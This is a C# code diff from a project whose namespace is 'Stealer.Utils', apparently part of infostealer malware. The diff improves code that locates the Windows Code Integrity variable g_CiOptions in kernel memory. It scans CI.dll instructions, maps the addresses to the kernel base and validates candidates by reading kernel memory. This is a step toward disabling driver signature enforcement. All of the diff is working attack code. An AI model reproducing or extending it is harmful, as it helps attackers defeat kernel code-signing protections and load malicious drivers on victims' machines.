@@ -337,22 +337,19 @@ namespace Stealer.Utils
             try
             {
                 IntPtr ciInitializeAddr = GetProcAddress(userCiBase, "CiInitialize");
-                IntPtr gCiOptionsUserAddr = IntPtr.Zero;
+                IntPtr gCiOptionsKernelAddr = IntPtr.Zero;
 
                 if (ciInitializeAddr != IntPtr.Zero)
                 {
-                    gCiOptionsUserAddr = ScanForGCiOptions(ciInitializeAddr, 0x100);
+                    gCiOptionsKernelAddr = ScanForGCiOptions(ciInitializeAddr, 0x1000, userCiBase, ciKernelBase);
                 }
 
-                if (gCiOptionsUserAddr == IntPtr.Zero)
+                if (gCiOptionsKernelAddr == IntPtr.Zero)
                 {
-                    gCiOptionsUserAddr = ScanModuleForGCiOptionsPattern(userCiBase);
+                    gCiOptionsKernelAddr = ScanModuleForGCiOptionsPattern(userCiBase, ciKernelBase);
                 }
 
-                if (gCiOptionsUserAddr == IntPtr.Zero) return IntPtr.Zero;
-
-                long offset = (long)gCiOptionsUserAddr - (long)userCiBase;
-                return new IntPtr((long)ciKernelBase + offset);
+                return gCiOptionsKernelAddr;
             }
             finally
             {
@@ -398,7 +395,7 @@ namespace Stealer.Utils
             return IntPtr.Zero;
         }
 
-        private static IntPtr ScanForGCiOptions(IntPtr baseAddr, int maxOffset)
+        private static IntPtr ScanForGCiOptions(IntPtr baseAddr, int maxOffset, IntPtr userCiBase, IntPtr ciKernelBase)
         {
             byte[] code = new byte[maxOffset];
             Marshal.Copy(baseAddr, code, 0, maxOffset);
@@ -412,7 +409,15 @@ namespace Stealer.Utils
                 {
                     int rel = BitConverter.ToInt32(code, i + 2);
                     IntPtr nextInstr = new IntPtr(baseAddr.ToInt64() + i + 10);
-                    return new IntPtr(nextInstr.ToInt64() + rel);
+                    IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
+                    long offset = userTarget.ToInt64() - userCiBase.ToInt64();
+                    IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
+
+                    uint val = ReadKernelMemory32(cand);
+                    if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || (val != 0 && (val & 6) != 0))
+                    {
+                        return cand;
+                    }
                 }
             }
 
@@ -423,7 +428,15 @@ namespace Stealer.Utils
                 {
                     int rel = BitConverter.ToInt32(code, i + 2);
                     IntPtr nextInstr = new IntPtr(baseAddr.ToInt64() + i + 6);
-                    return new IntPtr(nextInstr.ToInt64() + rel);
+                    IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
+                    long offset = userTarget.ToInt64() - userCiBase.ToInt64();
+                    IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
+
+                    uint val = ReadKernelMemory32(cand);
+                    if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || (val != 0 && (val & 6) != 0))
+                    {
+                        return cand;
+                    }
                 }
             }
 
@@ -434,14 +447,22 @@ namespace Stealer.Utils
                 {
                     int rel = BitConverter.ToInt32(code, i + 3);
                     IntPtr nextInstr = new IntPtr(baseAddr.ToInt64() + i + 7);
-                    return new IntPtr(nextInstr.ToInt64() + rel);
+                    IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
+                    long offset = userTarget.ToInt64() - userCiBase.ToInt64();
+                    IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
+
+                    uint val = ReadKernelMemory32(cand);
+                    if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || (val != 0 && (val & 6) != 0))
+                    {
+                        return cand;
+                    }
                 }
             }
 
             return IntPtr.Zero;
         }
 
-        private static IntPtr ScanModuleForGCiOptionsPattern(IntPtr userBase)
+        private static IntPtr ScanModuleForGCiOptionsPattern(IntPtr userBase, IntPtr ciKernelBase)
         {
             string[] exports = new string[] {
                 "CiInitialize",
@@ -455,7 +476,7 @@ namespace Stealer.Utils
                 IntPtr exportAddr = GetProcAddress(userBase, exp);
                 if (exportAddr != IntPtr.Zero)
                 {
-                    IntPtr target = ScanForGCiOptions(exportAddr, 0x1000);
+                    IntPtr target = ScanForGCiOptions(exportAddr, 0x1000, userBase, ciKernelBase);
                     if (target != IntPtr.Zero) return target;
                 }
             }
@@ -463,7 +484,7 @@ namespace Stealer.Utils
             try
             {
                 IntPtr textSection = new IntPtr(userBase.ToInt64() + 0x1000);
-                return ScanForGCiOptions(textSection, 0x30000);
+                return ScanForGCiOptions(textSection, 0x30000, userBase, ciKernelBase);
             }
             catch { }
 
